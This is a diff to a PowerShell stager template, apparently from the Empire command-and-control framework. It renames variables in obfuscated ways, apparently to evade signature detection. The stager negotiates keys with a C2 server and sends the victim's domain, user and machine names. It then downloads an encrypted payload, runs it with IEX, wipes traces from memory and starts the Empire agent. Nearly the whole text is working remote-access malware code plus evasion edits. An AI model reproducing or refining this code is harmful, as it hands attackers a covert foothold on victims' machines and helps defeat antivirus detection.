@@ -12,53 +12,55 @@
 function Start-Negotiate {
     param($s,$SK,$UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',$hop)
     function ConvertTo-RC4ByteStream {
-        Param ($K, $Data)
+        Param ($A, $B);
         process {
-            ForEach ($Byte in $Data) {
-                $i = ($i + 1) % 256
-                $j = ($j + $S[$i]) % 256
-                $S[$i], $S[$j] = $S[$j], $S[$i]
-                $Byte -bxor $S[($S[$i] + $S[$j]) % 256]
+            ForEach ($C in $B) {
+                $D = ($D + 1) % 256;
+                $E = ($E + $F[$D]) % 256;
+                $F[$D], $F[$E] = $F[$E], $F[$D];
+                $C -bxor $F[($F[$D] + $F[$E]) % 256];
             }
         }
         begin {
-            [Byte[]] $S = 0..255
-            $j = 0
+            [Byte[]] $F = 0..255;
+            $E = 0;
             0..255 | ForEach-Object {
-                $j = ($j + $S[$_] + $K[$_ % $K.Length]) % 256
-                $S[$_], $S[$j] = $S[$j], $S[$_]
-            }
-            $i = $j = 0
+                $E = ($E + $F[$_] + $A[$_ % $A.Length]) % 256;
+                $F[$_], $F[$E] = $F[$E], $F[$_];
+            };
+            $D = $E = 0;
         }
     }
     
+    
 
     function Decrypt-Bytes {
-        param ($A, $B)
+        param ($A, $B);
         if ($B.Length -gt 32) {
-            $C = New-Object System.Security.Cryptography.HMACSHA256
-            $D = [System.Text.Encoding]::ASCII
+            $C = New-Object System.Security.Cryptography.HMACSHA256;
+            $D = [System.Text.Encoding]::ASCII;
             # Verify the HMAC
-            $E = $B[-10..-1]
-            $B = $B[0..($B.length - 11)]
-            $C.Key = $D.GetBytes($A)
-            $F = $C.ComputeHash($B)[0..9]
+            $E = $B[-10..-1];
+            $B = $B[0..($B.length - 11)];
+            $C.Key = $D.GetBytes($A);
+            $F = $C.ComputeHash($B)[0..9];
             if (@(Compare-Object $E $F -Sync 0).Length -ne 0) {
-                return
+                return;
             }
             # Extract the IV
-            $G = $B[0..15]
+            $G = $B[0..15];
             try {
-                $H = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+                $H = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
             } catch {
-                $H = New-Object System.Security.Cryptography.RijndaelManaged
+                $H = New-Object System.Security.Cryptography.RijndaelManaged;
             }
-            $H.Mode = "CBC"
-            $H.Key = $D.GetBytes($A)
-            $H.IV = $G
-            ($H.CreateDecryptor()).TransformFinalBlock(($B[16..$B.length]), 0, $B.Length - 16)
+            $H.Mode = "CBC";
+            $H.Key = $D.GetBytes($A);
+            $H.IV = $G;
+            ($H.CreateDecryptor()).TransformFinalBlock(($B[16..$B.length]), 0, $B.Length - 16);
         }
-    }    
+    }
+        
 
     # make sure the appropriate assemblies are loaded
     $nope = [Reflection.Assembly]::LoadWithPartialName("System.Security");
@@ -72,16 +74,16 @@ function Start-Negotiate {
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
     try {
-        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        $sEa=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     }
     catch {
-        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+        $sEa=New-Object System.Security.Cryptography.RijndaelManaged;
     }
     
     $IV = [byte] 0..255 | Get-Random -count 16;
-    $AES.Mode="CBC";
-    $AES.Key=$SKB;
-    $AES.IV = $IV;
+    $sEa.Mode="CBC";
+    $sEa.Key=$SKB;
+    $sEa.IV = $IV;
 
     $hmac = New-Object System.Security.Cryptography.HMACSHA256;
     $hmac.Key = $SKB;
@@ -99,7 +101,7 @@ function Start-Negotiate {
     $ib=$e.getbytes($rk);
 
     # encrypt/HMAC the packet for the c2 server
-    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
+    $eb=$IV+$sEa.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
     $eb=$eb+$hmac.ComputeHash($eb)[0..9];
 
     # if the web client doesn't exist, create a new web client and set appropriate options
@@ -157,15 +159,15 @@ function Start-Negotiate {
 
     # create a new AES object
     try {
-        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        $sEa=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     }
     catch {
-        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+        $sEa=New-Object System.Security.Cryptography.RijndaelManaged;
     }
     $IV = [byte] 0..255 | Get-Random -Count 16;
-    $AES.Mode="CBC";
-    $AES.Key=$e.GetBytes($key);
-    $AES.IV = $IV;
+    $sEa.Mode="CBC";
+    $sEa.Key=$e.GetBytes($key);
+    $sEa.IV = $IV;
 
     # get some basic system information
     $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
@@ -203,7 +205,7 @@ function Start-Negotiate {
 
     # send back the initial system information
     $ib2=$e.getbytes($i);
-    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
+    $eb2=$IV+$sEa.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
     $hmac.Key = $e.GetBytes($key);
     $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];
 
@@ -243,11 +245,11 @@ function Start-Negotiate {
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
-    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
+    $sEa=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -s "$ser" -SK '{{ staging_key }}' -UA $u -hop "$hop";
+Start-Negotiate -s "$hom" -SK '{{ staging_key }}' -UA $u -hop "$hop";
